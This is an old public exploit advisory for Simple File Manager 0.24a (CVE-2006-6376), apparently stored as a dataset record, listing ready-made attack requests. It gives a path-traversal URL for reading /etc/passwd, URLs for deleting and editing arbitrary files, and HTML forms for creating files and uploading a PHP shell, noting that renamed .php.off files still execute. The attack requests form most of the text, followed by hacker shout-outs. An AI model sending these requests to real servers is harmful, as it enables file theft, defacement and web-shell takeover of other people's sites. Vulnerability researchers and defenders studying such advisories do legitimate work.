{
  "id": "2883",
  "title": "simple file manager 0.24a - Multiple Vulnerabilities",
  "cve": "CVE-2006-6376",
  "vuln_type": "rce",
  "code": "/*******************************************\\\r\n| flame vrs Simple File Manager <=0.24=>    |\r\n| http://onedotoh.sourceforge.net/          |\r\n| Various Vulnerbilities Including:         |\r\n\\*******************************************/\r\n/+++++++++++++++++++++++++++++++++++++++++++\\\r\n| Using the scripts supplied by the webapp: |\r\n| Reading of Arbitrary files                |\r\n| Deletion of Arbitrary files               |\r\n| Modification of Arbitrary files           |\r\n| Creation of Arbitrary files               |\r\n| Uploading of Malicious files              |\r\n\\+++++++++++++++++++++++++++++++++++++++++++/\r\n\r\n\r\n/&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&\\\r\n| Simple File Manager (SFM) is a web based  |\r\n| file management utility.                  |\r\n| It is designed to be used by those that   |\r\n| don't want to use ftp or SHOULD NOT use   |\r\n| ftp. It can be dropped into a specific    |\r\n| directory and give access to that         |\r\n| directory as well as any directory below  |\r\n| it, including those created by SFM. It    |\r\n| can be placed in a specific directory and |\r\n| configured to give access to other        |\r\n| directories outside of its location       |\r\n| (centralized). SFM gives its user upload, |\r\n| rename, delete, directory creation as     |\r\n| well as directory navigation (within its  |\r\n| tree limits), as well as Create New File; |\r\n| it also includes an image viewer, text    |\r\n| viewer and mime type downloading.         |\r\n\\&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/\r\n | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ |\r\n | Thats the description from the author...|\r\n | Which basically outlines all of its     |\r\n | vulnerbilities.                         |\r\n \\_________________________________________/\r\n\r\n/=========================================================================================================================\\\r\n############################ .:Reading of Arbitrary Files:. ###############################################################\r\n# fm.php?action=download&filename=[RELATIVE PATH / FILENAME]&pathext=&u=&&copt=1&sortKey=2                                #\r\n# EG: http://www.site.com/file/fm.php?action=download&filename=../../../../../../etc/passwd&pathext=&u=&&copt=1&sortKey=2 #\r\n###########################################################################################################################\r\n\\=========================================================================================================================/\r\n\r\n/=========================================================================================================================\\\r\n############################ .:Deletion of Arbirary Files:. ###############################################################\r\n# fm.php?delete=[RELATIVE PATH / FILENAME]&copt=1&sortKey=2&u=&pathext=                                                   #\r\n# EG: http://www.site.com/file/fm.php?delete=phpshell.php&copt=1&sortKey=2&u=&pathext=                                    #\r\n###########################################################################################################################\r\n\\=========================================================================================================================/\r\n\r\n/=========================================================================================================================\\\r\n############################# .:Modification of Arbitrary Files:. #########################################################\r\n# fm.php?edit=[RELATEIVE PATH / FILENAME]&u=&copt=1&pathext=                                                              #\r\n# EG: http://www.site.com/file/fm.php?edit=../index.php&u=&copt=1&pathext=                                                #\r\n###########################################################################################################################\r\n\\=========================================================================================================================/\r\n\r\n/=========================================================================================================================\\\r\n############################# .:Creation of Arbitrary Files:. #############################################################\r\n# START LOCAL HTML FILE:                                                                                                  #\r\n <form name=\"form1\" method=\"post\" action=\"http://www.site.com/file/fm.php\">\r\n <center>Filename: <input type=\"text\" name=\"newfilename\">\r\n <select class=altButton name=\"newfileext\">\r\n <option>.txt</option><option>.html</option><option>.php</option>\r\n </select>\r\n <textarea name=\"newcontent\" cols=\"60\" rows=\"15\">&lt;/textarea&gt;\r\n <input type=\"hidden\" name=\"copt\" value=\"1\">\r\n <input type=\"submit\" name=\"savenew\" value=\"Save\">\r\n <input type=\"hidden\" name=\"u\" value=\"\">\r\n <input type=\"hidden\" name=\"pathext\" value=\"/\">\r\n <input type=\"hidden\" name=sortKey value=\"2\">\r\n </center>\r\n </form>\r\n# END LOCAL HTML FILE                                                                                                     #\r\n###########################################################################################################################\r\n# Note... various characters are escaped. And by default all .php files will be renamed to file.php.off                   #\r\n# Note... The author decided to let you change the fm.php file anyway (*See Modification of Arbitrary files)              #\r\n###########################################################################################################################\r\n\\=========================================================================================================================/\r\n\r\n/=========================================================================================================================\\\r\n############################## .: Uploading of Malicious Files:. ##########################################################\r\n# START LOCAL HTML FILE:                                                                                                  #\r\n<form name=\"form1\" method=\"post\" action=\"http://www.site.com/file/fm.php\" enctype=\"multipart/form-data\">\r\n<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"104857600\">\r\n<input type=\"hidden\" name=\"copt\" value=\"1\">\r\n<input type=\"file\" name=\"uploadedfile\">\r\n<input type=\"submit\" name=\"upload\" value=\"Upload\">\r\n<input type=\"hidden\" name=\"u\" value=\"\">\r\n<input type=\"hidden\" name=\"pathext\" value=\"/\">\r\n<input type=\"hidden\" name=sortKey value=\"2\">\r\n</form>\r\n# END LOCAL HTML FILE                                                                                                     #\r\n###########################################################################################################################\r\n# Note... By default all .php files will be renamed to file.php.off, you can usually just browse to the file anyway and it#\r\n# will execute... EG: http://www.site.com/file/phpshell.php.off                                                           #\r\n###########################################################################################################################\r\n\\=========================================================================================================================/\r\n\r\n                                       /++++++++++++++++++++++++++++\\\r\n                                       | Be good, and dont be too   |\r\n                                       | hopeful about finding      |\r\n                                       | yourself a gibbon running  |\r\n                                       | this script. It predates   |\r\n                                       | my #999999 hair.           |\r\n                                       \\++++++++++++++++++++++++++++/\r\n\r\n      /{S}{H}{O}{U}{T}{-}{O}{U}{T}{S}{!}{!}{!}\\\r\n      |---------------------------------------|\r\n      | <&bk> stfu flame                      |\r\n      | <~PhaZe_One> no fame without flame    |\r\n      | <+c|p> I love you flame               |\r\n      | <%emc2> flame wishes death upon you   |\r\n      | <Thaimaishu> are you emo flame?       |\r\n      | <&[myg0t]40> flame dont be mad        |\r\n      | *~str0ke humps flame's leg            |\r\n      | <&ZoNe_VoRTeX> <3 flame               |\r\n      |---------------------------------------|\r\n      \\{S}{H}{O}{U}{T}{-}{O}{U}{T}{S}{!}{!}{!}/\r\n\r\n# milw0rm.com [2006-12-02]",
  "url": "https://www.exploit-db.com/exploits/2883"
}